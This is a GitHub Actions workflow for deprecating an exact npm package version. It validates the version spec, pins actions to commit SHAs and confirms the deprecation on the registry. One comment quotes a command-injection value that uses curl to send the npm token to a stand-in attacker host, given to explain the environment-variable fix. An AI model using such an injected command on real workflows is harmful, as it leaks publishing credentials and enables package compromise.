name: Deprecate a version

# Marks published versions as dead without deleting them.
#
# Deletion needs account-level rights that the CI token does not have — unpublish
# is refused, even for a version minutes old. Deprecation is the supported,
# reversible equivalent: the version stays installable for anyone who pinned it,
# and the registry tells everyone else not to.
#
# The spec must be an exact version, so a mistyped input cannot deprecate a whole
# package or the current release by accident.
on:
  workflow_dispatch:
    inputs:
      spec:
        description: "Exact version to deprecate, e.g. name@1.2.3"
        required: true
        type: string
      message:
        description: "Deprecation message shown on npm"
        required: true
        type: string

permissions:
  contents: read

jobs:
  deprecate:
    runs-on: ubuntu-latest
    # Dispatch inputs reach the shell through the environment, never through `${{ }}` in a `run:`
    # body. GitHub expands an expression into the script *before* bash parses it, so a `message` of
    # `"; curl -s https://attacker.example --data $NODE_AUTH_TOKEN #` ran as a command in a job that
    # holds the npm token. `"$SPEC"` is a quoted variable reference: the value can only ever be an
    # argument.
    env:
      SPEC: ${{ inputs.spec }}
      MESSAGE: ${{ inputs.message }}
    steps:
      - name: Refuse a non-exact spec
        # A parse, not a glob: `*@*.*.*` accepted `pkg@>=1.2.3` and `pkg@1.x.x`, and `npm
        # deprecate` applies a range to every matching version.
        run: node scripts/assert-exact-spec.mjs "$SPEC"

      # Pinned to a full commit SHA like every other action in a job that holds a long-lived token:
      # a moved tag must not be able to change the code that runs beside NPM_TOKEN.
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 22
          registry-url: https://registry.npmjs.org

      - name: Deprecate
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: npm deprecate "$SPEC" "$MESSAGE"

      - name: Confirm the registry agrees
        run: |
          set -euo pipefail
          for attempt in 1 2 3 4 5 6; do
            message="$(npm view "$SPEC" deprecated 2>/dev/null || true)"
            if [ -n "$message" ]; then
              echo "deprecated: $message"
              exit 0
            fi
            echo "not visible yet (attempt $attempt); waiting for replication"
            sleep 20
          done
          echo "::error::the registry still reports no deprecation for $SPEC"
          exit 1
